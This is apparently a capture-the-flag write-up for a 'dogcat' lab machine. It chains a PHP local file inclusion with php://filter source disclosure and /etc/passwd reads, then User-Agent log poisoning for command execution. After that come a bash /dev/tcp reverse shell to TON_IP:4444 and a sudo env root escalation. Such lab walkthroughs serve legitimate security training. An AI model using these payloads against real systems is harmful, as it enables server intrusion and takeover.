First, we analysis the home page 
<img width="1186" height="984" alt="image" src="https://github.com/user-attachments/assets/d38f6871-572d-4847-9f42-5577123f0c0a" />

We saw when we click on A dog or A cat button, this appears on this URL 
<img width="271" height="45" alt="image" src="https://github.com/user-attachments/assets/1bced629-33f3-4a5c-9435-dd7fa4382a36" />

So, We can put this in the URL : 
```
?view=php://filter/convert.base64-encode/resource=cat../../index
```

We can get source home page in base64, with this command we can decode it: 
```
echo "Base64 Here" | base64 -d
```

It gives us : 
```html
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

So we can see, the logic of code. If we put ext=, we can get the passwd file, like this: 
```
?view=cat/../../../../etc/passwd&ext=
```

<img width="1195" height="975" alt="image" src="https://github.com/user-attachments/assets/bd483e4b-374e-4748-ade9-54a94692f117" />

To get the first flag put this in url : 
```
?view=php://filter/convert.base64-encode/resource=cat../../flag
```

<img width="1195" height="975" alt="image" src="https://github.com/user-attachments/assets/2e4974e3-a7bd-4154-a497-ba83d38df3f1" />
---

For an RCE: 
type in the terminal : 
```
curl -s "http://10.130.149.180/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
```

then this url in the website : 
```
http://10.130.149.180/?view=cat/../../../../var/log/apache2/access.log&ext=&cmd=id
```

and then set up a listener  :
```
nc -lvnp 4444
```

then :
```
http://10.130.149.180/?view=cat/../../../../var/log/apache2/access.log&ext=&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/TON_IP/4444+0>%261' 
```

GG u took control of the server!!


---
then to be a root :

```
sudo -l 
```
<img width="682" height="132" alt="image" src="https://github.com/user-attachments/assets/71378776-371e-4583-8e13-bd2739336acd" />

GO GTFOBINS :
<img width="935" height="541" alt="image" src="https://github.com/user-attachments/assets/24ed595a-0030-4de5-be23-79c5603e6784" />

then :
```
sudo env /bin/sh
```
GOOD GAME THIRD FLAG !
---
